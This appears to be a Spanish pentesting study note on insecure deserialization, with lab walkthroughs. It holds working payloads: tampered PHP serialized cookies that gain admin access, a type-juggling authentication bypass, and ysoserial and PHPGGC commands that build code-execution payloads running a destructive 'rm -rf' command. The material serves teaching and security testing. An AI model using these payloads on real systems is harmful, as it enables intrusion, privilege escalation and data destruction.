# Insecure Deserialization

## Table of contents

- [Insecure Deserialization](#insecure-deserialization)
  - [Serializacion vs. Deserializacion](#serializacion-vs-deserializacion)
    - [¿Qué es la serialización?](#qu-es-la-serializacin)
    - [¿Qué es la deserialización?](#qu-es-la-deserializacin)
  - [¿Qué es la deserialización insegura?](#qu-es-la-deserializacin-insegura)
  - [¿Cómo surgen las vulnerabilidades de deserialización insegura?](#cmo-surgen-las-vulnerabilidades-de-deserializacin-insegura)
  - [Cómo identificar la deserialización insegura](#cmo-identificar-la-deserializacin-insegura)
  - [PHP serialization format](#php-serialization-format)
  - [NodeJS serialization format](#nodejs-serialization-format)
  - [Java serialization format](#java-serialization-format)
  - [Bytes del objeto serializado](#bytes-del-objeto-serializado)
  - [Explotacion](#explotacion)
    - [Modifying serialized objects](#modifying-serialized-objects)
    - [Modifying data types (TYPE JUGGLING)](#modifying-data-types-type-juggling)
    - [Uso de la funcionalidad de la aplicación](#uso-de-la-funcionalidad-de-la-aplicacin)
  - [Metodos Magicos](#metodos-magicos)
  - [Inyectar objetos arbitrarios](#inyectar-objetos-arbitrarios)
    - [Inyección de objetos arbitrarios en PHP](#inyeccin-de-objetos-arbitrarios-en-php)
  - [Gadgets Chain](#gadgets-chain)
  - [Trabajar con cadenas de gadgets preconstruidos](#trabajar-con-cadenas-de-gadgets-preconstruidos)
    - [ysoserial](#ysoserial)
      - [Explotando la deserialización de Java con Apache Commons](#explotando-la-deserializacin-de-java-con-apache-commons)
        - [USANDO BURP EXTENSION (JAVA DESERIALIZATION SCANNER)](#usando-burp-extension-java-deserialization-scanner)
    - [PHP Generic Gadget Chains (PHPGGC)](#php-generic-gadget-chains-phpggc)

![[Pasted image 20230215004335.png]]

## Serializacion vs. Deserializacion

### ¿Qué es la serialización?

La serialización es el proceso de convertir estructuras de datos complejas, como objetos y sus campos, en un formato "más plano" que se puede enviar y recibir como un flujo secuencial de bytes. La serialización de datos hace que sea mucho más sencillo:

- Escriba datos complejos en la memoria entre procesos, un archivo o una base de datos.
- Envíe datos complejos, por ejemplo, a través de una red, entre diferentes componentes de una aplicación o en una llamada API.

Fundamentalmente, al serializar un objeto, su estado también se conserva. En otras palabras, se conservan los atributos del objeto, junto con sus valores asignados.

### ¿Qué es la deserialización?

La deserialización es el proceso de restaurar este flujo de bytes a una réplica completamente funcional del objeto original, en el estado exacto en que se serializó. La lógica del sitio web puede entonces interactuar con este objeto deserializado, como lo haría con cualquier otro objeto.

Muchos lenguajes de programación ofrecen soporte nativo para serialización. Exactamente cómo se serializan los objetos depende del idioma. Algunos lenguajes serializan objetos en formatos binarios, mientras que otros usan diferentes formatos de cadena, con diversos grados de legibilidad humana. Tenga en cuenta que todos los atributos del objeto original se almacenan en el flujo de datos serializados, incluidos los campos privados.

![[Pasted image 20230215004542.png]]

## ¿Qué es la deserialización insegura?

La deserialización insegura es cuando un sitio web deserializa los datos controlables por el usuario. Esto potencialmente permite que un atacante manipule objetos serializados para pasar datos dañinos al código de la aplicación.

Incluso es posible reemplazar un objeto serializado con un objeto de una clase completamente diferente. De manera alarmante, los objetos de cualquier clase que esté disponible en el sitio web serán deserializados e instanciados, independientemente de la clase que se esperaba. Por esta razón, la deserialización insegura a veces se conoce como una vulnerabilidad de "**inyección de objetos**".

Un objeto de una clase inesperada puede causar una excepción. En ese momento, sin embargo, es posible que el daño ya esté hecho. Muchos ataques basados en deserialización se completan antes de que finalice la deserialización. Esto significa que el propio proceso de deserialización puede iniciar un ataque, incluso si la propia funcionalidad del sitio web no interactúa directamente con el objeto malicioso. Por este motivo, los sitios web cuya lógica se basa en lenguajes fuertemente tipados también pueden ser vulnerables a estas técnicas.

## ¿Cómo surgen las vulnerabilidades de deserialización insegura?

A veces los propietarios de sitios web piensan que están seguros porque implementan algún tipo de verificación adicional en los datos deserializados. Este enfoque a menudo es ineficaz porque es prácticamente imposible implementar la validación o el saneamiento para dar cuenta de cada eventualidad. Estas comprobaciones también son fundamentalmente defectuosas, ya que se basan en la comprobación de los datos después de que se hayan deserializado, lo que en muchos casos será demasiado tarde para evitar el ataque.

También pueden surgir vulnerabilidades porque a menudo se supone que los objetos deserializados son confiables.

## Cómo identificar la deserialización insegura

Identificar la deserialización insegura es relativamente simple, independientemente de si está realizando una prueba de caja blanca o negra.

Durante la auditoría, debe observar todos los datos que se transfieren al sitio web e intentar identificar cualquier cosa que parezca datos serializados.

>[!tip]
>Si esta usando Burp Suite Professional , **Burp Scanner** marcará automáticamente cualquier mensaje HTTP que parezca contener objetos serializados.

## PHP serialization format

PHP utiliza un formato de cadena en su mayoría legible por humanos, con letras que representan el tipo de datos y números que representan la longitud de cada entrada. 

Por ejemplo, considere un objeto `User` con los atributos:

```php
$user->name = "carlos";
$user->isLoggedIn = true;
```

Cuando se serializa, este objeto puede verse así:

```php
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```

Esto se puede interpretar de la siguiente manera:

-   `O:4:"User"` - Un objeto con el nombre de clase de 4 caracteres `"User"`
-   `2` - el objeto tiene 2 atributos
-   `s:4:"name"` - La clave del primer atributo es un string de 4 caracteres `"name"`
-   `s:6:"carlos"`- El valor del primer atributo es un string de 6 caracteres `"carlos"`
-   `s:10:"isLoggedIn"`- La clave del segundo atributo es un string de 10 caracteres `"isLoggedIn"`
-   `b:1`- El valor del segundo atributo es el valor booleano `true` (1)

>[!tip]
>Los métodos nativos para la serialización de PHP son `serialize()` y `unserialize()`. Si tiene acceso al código fuente, debe comenzar por buscar en cualquier parte del código `unserialize()` e investigar más a fondo.

Serializar un objeto en PHP desde consola:

```bash
php -a #abrimos una sesion interactiva
```

```bash
php > $original_data = array("HTB", 123, 7.77);
php > $serialized_data = serialize($original_data);
php > echo $serialized_data;
a:3:{i:0;s:3:"HTB";i:1;i:123;i:2;d:7.77;}
php > $reconstructed_data = unserialize($serialized_data);
php > var_dump($reconstructed_data);
array(3) {
  [0]=>
  string(3) "HTB"
  [1]=>
  int(123)
  [2]=>
  float(7.77)
}
```

## NodeJS serialization format

NodeJS normalmente serializa la informacion usando **base64**:

```javascript
{"username":"ajin","country":"india","city":"bangalore"}
```

en base64:

```bash
eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=
```

## Python serialization format

Hay varias bibliotecas para Python que implementan la serialización, como [PyYAML](https://pyyaml.org/) y [JSONpickle](https://jsonpickle.github.io/) . Sin embargo, [Pickle](https://docs.python.org/3/library/pickle.html) es la implementación nativa y es lo que se usará en este ejemplo.

```python
import pickle

original_nada = ["HTB", 123, 7.77]
serialized_data = pickle.dumps(original_data)
print(serialized_data)

# b'\x80\x04\x95\x16\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x03HTB\x94K{G@\x1f\x14z\xe1G\xae\x14e.'

reconstructed_data = pickle.loads(serialized_data)
print(reconstructed_data)

# ['HTB', 123, 7.77]
```

>[!note]
>De la salida serializada los bytes `'\x80\x04'` indica que esta usando el protocolo version 4 de pickle.

Picke tiene diferentes versiones de protocolo que pueden ser especificados:

```python
import pickle

data = {"gangnam":"style"}
serialized = pickle.dumps(data,protocol=0) #los protocolos van del 0 al 5
print(serialized)
```

- [mas acerca de los protocols en python](https://stackoverflow.com/questions/23582489/python-pickle-protocol-choice)

## Java serialization format

Algunos lenguajes, como Java, usan formatos de serialización binarios. Esto es más difícil de leer, pero aún puede identificar datos serializados si sabe cómo reconocer algunos signos reveladores. Por ejemplo, los objetos Java serializados siempre comienzan con los mismos bytes, que se codifican en `ac ed` hexadecimal y `rO0` en Base64.

## Bytes del objeto serializado

|Object Type|Header (Hex)|Header (Base64)|
|:--------:|:--------:|:-------:|
|Java Serialized|AC ED|rO0|
|.NET ViewState|FF 01|/w|
|Python Pickle|80 04 95|gASV|
|PHP Serialized|4F 3A|Tz|

## Identificacion de serializacion

### Caja Blanca

Cuando tenemos acceso al código fuente, queremos buscar llamadas a funciones específicas para identificar rápidamente posibles vulnerabilidades de deserialización. Estas funciones incluyen (pero ciertamente no se limitan a):

-   `unserialize()` - PHP
-   `pickle.loads()` - Python Pickle
-   `jsonpickle.decode()` - Python JSONPickle
-   `yaml.load()` - Python PyYAML / ruamel.yaml
-   `readObject()` - Java
-   `Deserialize()` - C# / .NET
-   `Marshal.load()` - Ruby


### Caja Negra

Si no tenemos acceso al código fuente, aún es fácil identificar los datos serializados debido a las distintas características de los datos serializados:

-   Si se parece a: `a:4:{i:0;s:4:"Test";i:1;s:4:"Data";i:2;a:1:{i:0;i:4;}i:3;s:7:"ACADEMY";}` - PHP
-   Si se parece a: `(lp0\nS'Test'\np1\naS'Data'\np2\na(lp3\nI4\naaS'ACADEMY'\np4\na.` - Protocolo Pickle 0, [predeterminado para Python 2.x](https://github.com/python/cpython/blob/2.7/Lib/pickle.py#L177)
-   Bytes que comienzan con `80 01` (Hex) y terminan con `.` - Pickle Protocol 1, Python 2.x
-   Bytes que comienzan con `80 02` (Hex) y terminan con `.` - Pickle Protocol 2, Python 2.3+
-   Bytes que comienzan con `80 03` (Hex) y terminan con `.` - Pickle Protocol 3, [predeterminado para Python 3.0-3.7](https://github.com/python/cpython/blob/3.7/Lib/pickle.py#L379)
-   Bytes que comienzan con `80 04 95` (Hex) y terminan con `.` - Pickle Protocol 4, [predeterminado para Python 3.8+](https://github.com/python/cpython/blob/3.8/Lib/pickle.py#L415)
-   Bytes que comienzan con `80 05 95` (Hex) y terminan con `.` - Pickle Protocol 5, Python 3.x
-   `["Test", "Data", [4], "ACADEMY"]` - JSONPickle, Python 2.7 / 3.6+
-   `- Test\n- Data\n- - 4\n- ACADEMY\n` -PyYAML/ruamel.yaml, Python 3.6+
-   Bytes que comienzan con `AC ED 00 05 73 72` (Hex) o `rO0ABXNy` (Base64) - [Java](https://maxchadwick.xyz/blog/java-serialized-object-detection)
-   Bytes que comienzan con `00 01 00 00 00 ff ff ff ff` (Hex) o `AAEAAAD/////` (Base64) - C# / .NET
-   Bytes que comienzan con `04 08` (Hex) - Ruby

## Explotacion

### Modifying serialized objects

considere un sitio web que utiliza un objeto `User` serializado para almacenar datos sobre la sesión de un usuario en una cookie. Si un atacante detecta este objeto serializado en una solicitud HTTP, podría decodificarlo para encontrar el siguiente flujo de bytes:

![[Pasted image 20230215104442.png]]

los datos parece **base64** y comienza con `Tz` por lo que parece datos serializado en PHP:

![[Pasted image 20230215104819.png]]

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

El atributo `admin` es un punto de interés obvio. Un atacante podría simplemente cambiar el valor booleano del atributo a `1` (verdadero), volver a codificar el objeto y sobrescribir su cookie actual con este valor modificado.

supongamos que el sitio web utiliza esta cookie para verificar si el usuario actual tiene acceso a ciertas funciones administrativas:

```bash
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

![[Pasted image 20230215105027.png]]

pasamos esto como valor de la cookie al consultar nuestra cuenta y nos convertiremos en admin:

>[!tip]
>Es necesario cambiar esta cookie en todas las request que hagan acciones administrativas.

### Modifying data types (TYPE JUGGLING)

La lógica basada en PHP es particularmente vulnerable a este tipo de manipulación debido al comportamiento de su operador de comparación flexible (`==`) al comparar diferentes tipos de datos.

>[!note]
>Este ataque se lo conoce como **type juggling** y solo afecta a la logica de PHP.

Por ejemplo, si realiza una comparación suelta entre un número entero y una cadena, PHP intentará convertir la cadena en un número entero, lo que significa que `5 == "5"` se evalúa como `true`.

Inusualmente, esto también funciona para cualquier cadena alfanumérica que comience con un número. En este caso, PHP convertirá efectivamente la cadena completa a un valor entero basado en el número inicial. El resto de la cadena se ignora por completo. Por lo tanto, `5 == "5 of something"` en la práctica se trata como `5 == 5` (true).

Esto se vuelve aún más extraño cuando se compara una cadena con el entero `0`:

```php
0 == "Example string" // true
```

¿Por qué? Porque no hay número (0 números) en la cadena. PHP trata toda esta cadena como un entero `0`.

codigo vulnerable:

```php
$login = unserialize($_COOKIE)
if ($login['password'] == $password) {
// log in successfully
}
```

Supongamos que un atacante modificó el atributo de la contraseña para que contuviera el número entero `0` en lugar de la cadena esperada. **_Siempre que la contraseña almacenada no comience con un número, la condición siempre regresaría `true`, lo que permitiría omitir la autenticación._**

**ejemplo**

al consultar nuestro perfil vemos que se manda una cookie:

![[Pasted image 20230215120441.png]]

```bash
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjenhibHVocHFkdGo4cmF5dDQ2anozZjNha2lrbmlxdCI7fQ%3d%3d
```

cmomienza con `Tz` asi que parece data serializada en PHP, veamos su contenido:

![[Pasted image 20230215120626.png]]

podemos intentar el ataque **type juggling** para suplantar al usuario administrador:

![[Pasted image 20230215120724.png]]

-   Actualizamos la longitud del atributo `username` a `13`.
-   Cambiamos el username a `administrator`.
-   Cambiamos el **access token** al valor entero `0`. 
-   Reemplazamos el tipo de dato de `s` a `i`.

Este es el resultado:

```bash
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

consultamos nuevamente nuestra cuenta pero reemplazamos el valor de la cookie:

![[Pasted image 20230215121237.png]]

logramos escalar privilegios como administrador.

### Uso de la funcionalidad de la aplicación

Puede usar la deserialización insegura para pasar datos inesperados y aprovechar la funcionalidad relacionada para causar daños.

Por ejemplo:

como parte de la funcionalidad "Eliminar usuario" de un sitio web, la imagen de perfil del usuario se elimina al acceder a la ruta del archivo en el atributo `$user->image_location`. Si se `$user` creó a partir de un objeto serializado, un atacante podría explotarlo pasando un objeto modificado con el atributo `image_location` a una ruta de archivo arbitraria. Eliminar su propia cuenta de usuario también eliminaría este archivo arbitrario.

**ejemplo**

Al ver la cuenta de usuario vemos que nos genera una informacion serializada en las cookies:

![[Pasted image 20230215140748.png]]

esta es la informacion:

![[Pasted image 20230215140835.png]]

en nuestro perfil tenemos la obcion de eliminar la cuenta:

![[Pasted image 20230215140910.png]]

viendo la informacion serializada, descubrimos que cuando se elimina la cuenta, toma el valor **avatar_link** de la cookie y ealiza una eliminacion de ese archivo:

para que se entienda:

```bash
#al eliminar la cuenta
$data = unserialize($_COOKIE);
system("rm -rf $login['avatar_link']");
```

>[!note]
>Este es una suposicion de lo que hace el codigo backend, no se tiene la certeza si realiza lo mismo, de ser asi puede que sea vulnerable a **command injection** tambien.

podemos crear un nuevo objeto serializado y modificar ese valor para eliminar otro archivo:

```php
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"siko4e3s24jkbx7s044qlj82mqxuz985";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

**_No olvide modificar la longitud del valor avatar_link tambien**

![[Pasted image 20230215142033.png]]

## Metodos Magicos 

n PHP, las funciones cuyos nombres comienzan con `__` están reservadas para el idioma. Un subconjunto de estas funciones son los llamados [métodos mágicos](https://www.php.net/manual/en/language.oop5.magic.php) que incluyen funciones como `__sleep`, y . Estos son métodos especiales que sobrescriben las acciones predeterminadas de PHP cuando se invocan en un objeto.

Los métodos mágicos son un subconjunto especial de métodos que no tiene que invocar explícitamente. En cambio, se invocan automáticamente cada vez que ocurre un evento o escenario en particular. Es una caracteristica de la programacion orientada a objetos.

Uno de los ejemplos más comunes en PHP es `__construct()`, que se invoca cada vez que se instancia un objeto de la clase. Puedes crear una funcion personalizada que cambia lo que realmente hace:

```php
//funcion modificada
public function __construct($Name, $Email, $Password, $ProfilePic) {
    $this->setName($Name);
    $this->setEmail($Email);
    $this->setPassword($Password);
    $this->setProfilePic($ProfilePic);
}

//funcion original
public function __construct($Name, $Email, $Password, $ProfilePic) {
    $this->Name = $Name;
    $this->Email = $Email;
    $this->Password = $Password;
    $this->ProfilePic = $ProfilePic;
}
```

Los métodos mágicos son muy utilizados y no representan una vulnerabilidad por sí solos. Pero pueden volverse peligrosos cuando el código que ejecutan maneja datos controlables por un atacante

Métodos mágicos interesantes como `__construct()`, `__destruct()`, `__call()`, `__callStatic()`, `__get()`, `__set()`, `__isset()`, `__unset()`, `__sleep()`, `__wakeup()`, `__serialize()`, `__unserialize()`, `__toString()`, `__invoke()`, `__set_state()`, `__clone()`, y `__debugInfo()`:

|**Method**|**Description**|
|:------:|:------:|
|`___construct`|Defina un constructor para una clase. Se llama cuando se crea una nueva instancia. P.ej `new Class()`|
|`__toString`|Defina cómo reacciona un objeto cuando se trata como una cadena. P.ej `echo $obj`|
|`__call`|Llamado cuando intenta llamar a métodos inaccesibles en un contexto **de objeto , por ejemplo** `$obj->doesntExist()`|
|`__get`|Llamado cuando intenta leer propiedades inaccesibles, por ejemplo `$obj->doesntExist`|
|`__set`|Llamado cuando intenta escribir propiedades inaccesibles, por ejemplo `$obj->doesntExist = 1`|
|`__clone`|Llamado cuando intentas clonar un objeto, por ejemplo `$copy = clone $object`|
|`__destruct`|Llamado cuando se destruye un objeto (Opuesto al constructor)|
|`__isset`|Llamado cuando intenta llamar `isset()` o `isempty()` en propiedades inaccesibles, por ejemplo `isset($obj->doesntExist)`|
|`__invoke`|Llamado cuando intenta invocar un objeto como una función, por ejemplo `$obj()`|
|`__sleep`|Llamado al serializar un objeto. Si se definen \_\_serialize y \_\_sleep, este último se ignora. P.ej `serialize($obj)`|
|`__wakeup`|Se llama al deserializar un objeto. Si se definen \_\_unserialize y \_\_wakeup, este último se ignora. P.ej `unserialize($ser_obj)`|
|`__unset`|Llamado cuando intenta desarmar propiedades inaccesibles, por ejemplo `unset($obj->doesntExist)`|
|`__callStatic`|Llamado cuando intenta llamar a métodos inaccesibles en un contexto **estático , por ejemplo** `Class::doesntExist()`|
|`__set_state`|Se llama cuando `var_export` se llama a un objeto, por ejemplo `var_export($obj, true)`|
|`__debuginfo`|Se llama cuando `var_dump` se llama a un objeto, por ejemplo `var_dump($obj)`|
|`__unserialize`|Se llama al deserializar un objeto. Si se definen \_\_unserialize y \_\_wakeup, se usa \_\_unserialize. Solo en PHP 7.4+. P.ej `unserialize($obj)`|
|`__serialize`|Llamado al serializar un objeto. Si se definen \_\_serialize y \_\_sleep, se utiliza \_\_serialize. Solo en PHP 7.4+. P.ej `unserialize($obj)`|

## Inyectar objetos arbitrarios

En la programación orientada a objetos, los métodos disponibles para un objeto están determinados por su clase. Por lo tanto, si un atacante puede manipular qué clase de objeto se pasa como datos serializados, puede influir en qué código se ejecuta después e incluso durante la deserialización.

### Inyección de objetos arbitrarios en PHP

al interactuar con la pagina vemos que se realiza una peticion a un archivo PHP:

![[Pasted image 20230215150009.png]]

un truco para intentar ver el codigo fuente PHP en la respuesta es agregar una tilde (`~`) al final del nombre del archivo:

![[Pasted image 20230215150216.png]]

Se hace uso del metodo magico `__destruct()`que hace lo siguiente:

**_Si crea una función __destruct(), PHP llamará automáticamente a esta función al final del script._**

![[Pasted image 20230215150411.png]]

esta funcion se llamara al final del script PHP **si o si**, el metodo `unlink()` se utiliza cuando desea eliminar los archivos por completo. Por lo que podemos crear un objeto personalizado de la clase **CustomTemplate** y pasarle el atributo **lock_file_path** que, segun el script, sera eliminado al final.

creamos el objeto personalizado (para eliminar el archivo **/home/carlos/morale.txt**):

```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";

TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3D%3D
```

reemplazamos este valor en la cookie que contiene la data serializada:

![[Pasted image 20230215151304.png]]

se genera un error 500 obviamente porque no tiene el formato esperado (**objeto user**) pero pasara por el script y eliminara el archivo.

## Gadgets Chain

Un "gadget" es un fragmento de código que existe en la aplicación y que puede ayudar a un atacante a lograr un objetivo en particular. 

Es posible que un gadget individual no haga nada dañino directamente con la entrada del usuario. Sin embargo, el objetivo del atacante podría ser simplemente invocar un método que pase su entrada a otro gadget. Al encadenar varios gadgets de esta manera, un atacante puede potencialmente pasar su entrada a un peligroso "dispositivo receptor", donde puede causar el máximo daño.

## Trabajar con cadenas de gadgets preconstruidos

La identificación manual de cadenas de dispositivos puede ser un proceso bastante arduo y **es casi imposible sin acceso al código fuente**. Afortunadamente, hay algunas opciones para trabajar con cadenas de gadgets preconstruidas que puede probar primero.

Incluso si no tiene acceso al código fuente, puede usar estas herramientas para identificar y explotar vulnerabilidades de deserialización inseguras con relativamente poco esfuerzo.

### ysoserial

Una de esas herramientas para la deserialización de Java es "ysoserial". Esto le permite elegir una de las cadenas de gadgets proporcionadas para una biblioteca que cree que está usando la aplicación de destino, luego pasar un comando que desea ejecutar. Luego crea un objeto serializado apropiado basado en la cadena seleccionada.

Esto todavía implica una cierta cantidad de prueba y error, pero requiere mucho menos trabajo que construir sus propias cadenas de dispositivos manualmente.

>[!tip]
>ysoserial funciona mejor con jdk11, no funciona totalmente con jdk17

#### Explotando la deserialización de Java con Apache Commons

descargamos ysoserial de aqui:

- [https://github.com/frohoff/ysoserial/releases/tag/v0.0.6](https://github.com/frohoff/ysoserial/releases/tag/v0.0.6)

al consultar nuestra cuenta vemos que se envia una cookie con datos serializados:

![[Pasted image 20230215172103.png]]

los primeros caracteres `rO0` indica que es java en base64.

podemos usar la extension **Java Deserialization Scanner** para identificar si es vulnerbale a insecure deserialization con algun payload en especifico:

ahora usando **ysoserial** podemos generar un payload para que ejecute algun comando:

```bash
java -jar ysoserial.jar CommonsCollections4 'rm -rf /home/carlos/morale.txt' | base64 -w 0 | xclip -sel clip
```

esto nos generara un payload en base64 copiado a nuestra clipboard, lo reemplazamos en la cookie:

>[!tip]
>Tenemos que aplicar un URL-Encoded para que no corrompa los caracteres especiales.

![[Pasted image 20230215172609.png]]

recibimos un status 500 pero el comando se ejecuto correctamente en el servidor.

##### USANDO BURP EXTENSION (JAVA DESERIALIZATION SCANNER)

debemos configurar los jar de ysoserial y jdk que queramos usar para la explotacion:

![[Pasted image 20230216222831.png]]

una vez que vemos una peticion con datos serializados lo mandamos a la extension:

![[Pasted image 20230216223316.png]]

tambien lo mandamos a la parte de **explotation**.

en la parte de **configuration** seleccionamos **verbose moe** para tener un output mas detallado:

![[Pasted image 20230216223500.png]]

realizamos el descubrimiento:

![[Pasted image 20230216223612.png]]

1. seleccionamos los datos serializados (como en el intruder)
2. lo marcamos como un **entry point**
3. colocamos las codificaciones que usa (el payload primero se convierte a base64 y luego a url encoded para enviarlo)
4. iniciamos el ataque
5. verificamos los resultados

**_------------------> Probar con DNS (vuln library) como tipo de ataque <------------------_**

>[!note]
>en caso de presentarse el siguiente error `newlines in headers are not allowed` en el output **con verbose**, por favor revisar este video: [https://www.youtube.com/watch?v=mQAO5aLrKTw](https://www.youtube.com/watch?v=mQAO5aLrKTw)

El resultado puede no ser tan fiable y puede dar falsos negativos.

si se deetcta que es vulnerable a alguna libreria, pasamos a la parte de expotacion:

![[Pasted image 20230216224028.png]]

1. seleccionamos los datos serializados (como en el intruder)
2. lo marcamos como un **entry point**
3. definimos la libreria vulnerable y el comando a ejecutar
4. colocamos las codificaciones que usa (el payload primero se convierte a base64 y luego a url encoded para enviarlo)
5. iniciamos el ataque
6. verificamos los resultados

### PHP Generic Gadget Chains (PHPGGC)

descargamos **PHPGGC** de aqui:

- [https://github.com/ambionics/phpggc](https://github.com/ambionics/phpggc)

vemos que una pagina almacena datos serializados en una cookie:

![[Pasted image 20230215175822.png]]

tenemos que URL decodificarla:

![[Pasted image 20230215175919.png]]

el campo token es el que contiene informacion serializada en PHP, podemos enviar cualquier cosa para que genere un error e intente divulgar informacion:

```bash
{"token":"TXX=","sig_hmac_sha1":"fcbde5491cf811911b9a6382b1f23a2fc0a90e7a"}
```

![[Pasted image 20230215180104.png]]

vemos que nos muestra el framework y la version, esto es importante para usar PHPGGC, vamos a generar el payload:

listamos los payloads de la herramienta:

```bash
./phpggc -l
```

el que necesitamos segun la version es:

![[Pasted image 20230215180252.png]]

vemos mas informacion del payload payload:

```bash
./phpggc -i Symfony/RCE4
```

![[Pasted image 20230215180349.png]]

vemos que nos pide una `<function>` y un `<parameter>`, buscamos el CVE y vemos como funciona:

- [https://github.com/alex700/phar_deserialization](https://github.com/alex700/phar_deserialization)

![[Pasted image 20230215180544.png]]

creamos el payload:

```bash
./phpggc Symfony/RCE4 exec 'rm -rf /home/carlos/morale.txt' | base64 -w 0

#output
Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czozMDoicm0gLXJmIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9fXM6NTM6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBwb29sIjtPOjQ0OiJTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFByb3h5QWRhcHRlciI6Mjp7czo1NDoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHBvb2xIYXNoIjtpOjE7czo1ODoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyAHNldElubmVySXRlbSI7czo0OiJleGVjIjt9fQo=
```

![[Pasted image 20230215180635.png]]

reemplamos el payload en el valor **token** y al enviar ejecutara el comando.


## Caso de explotacion Laravel (caja blanca)

Tenemos acceso al codigo fuente de una pagina que usa **Laravel**, nos creamos una cuenta de prueba: `name: test, email: t@t.com, pass: 1234567`:

![[Pasted image 20230508233357.png]]

en la parte de **settings** vemos una opcion que es importar / exportar settings:

![[Pasted image 20230508233436.png]]

si damos a exportar nos genera una cadena que por los bytes de comienzo es una data serializada en PHP:

![[Pasted image 20230508233524.png]]

en el controlador del codigo fuente `HTController` velidamos que se exporta data serializada y al importar se deserializa la data entrante:

![[Pasted image 20230508233814.png]]

el contenido de la data exportada es el siguiente:

```bash
echo "TzoyNDoiQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzIjo0OntzOjMwOiIAQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzAE5hbWUiO3M6NDoidGVzdCI7czozMToiAEFwcFxIZWxwZXJzXFVzZXJTZXR0aW5ncwBFbWFpbCI7czo3OiJ0QHQuY29tIjtzOjM0OiIAQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzAFBhc3N3b3JkIjtzOjYwOiIkMnkkMTAkMTREREtUSXBEdExnaXpTSm1sRFUxZWJiS3lXQ2NTcVdCMGJWcFQvYXU2Y1FXQW1pM05wbUMiO3M6MzY6IgBBcHBcSGVscGVyc1xVc2VyU2V0dGluZ3MAUHJvZmlsZVBpYyI7czoxMToiZGVmYXVsdC5qcGciO30" | base64 -d

O:24:"App\Helpers\UserSettings":4:{s:30:"App\Helpers\UserSettingsName";s:4:"test";s:31:"App\Helpers\UserSettingsEmail";s:7:"t@t.com";s:34:"App\Helpers\UserSettingsPassword";s:60:"$2y$10$14DDKTIpDtLgizSJmlDU1ebbKyWCcSqWB0bVpT/au6cQWAmi3NpmC";s:36:"App\Helpers\UserSettingsProfilePic";s:11:"default.jpg";}
```

podemos intentar actualizar el email y luego importarla:

```bash
echo 'O:24:"App\Helpers\UserSettings":4:{s:30:"App\Helpers\UserSettingsName";s:4:"test";s:31:"App\Helpers\UserSettingsEmail";s:17:"hacker@htbank.com";s:34:"App\Helpers\UserSettingsPassword";s:60:"$2y$10$14DDKTIpDtLgizSJmlDU1ebbKyWCcSqWB0bVpT/au6cQWAmi3NpmC";s:36:"App\Helpers\UserSettingsProfilePic";s:11:"default.jpg";}' | base64

TzoyNDoiQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzIjo0OntzOjMwOiJBcHBcSGVscGVyc1xVc2VyU2V0dGluZ3NOYW1lIjtzOjQ6InRlc3QiO3M6MzE6IkFwcFxIZWxwZXJzXFVzZXJTZXR0aW5nc0VtYWlsIjtzOjE3OiJoYWNrZXJAaHRiYW5rLmNvbSI7czozNDoiQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzUGFzc3dvcmQiO3M6NjA6IiQyeSQxMCQxNERES1RJcER0TGdpelNKbWxEVTFlYmJLeVdDY1NxV0IwYlZwVC9hdTZjUVdBbWkzTnBtQyI7czozNjoiQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzUHJvZmlsZVBpYyI7czoxMToiZGVmYXVsdC5qcGciO30K
```

podemos buscar algun mensaje interesante en todo el codigo fuente asi:

```bash
grep -nr 'ie-message' .
```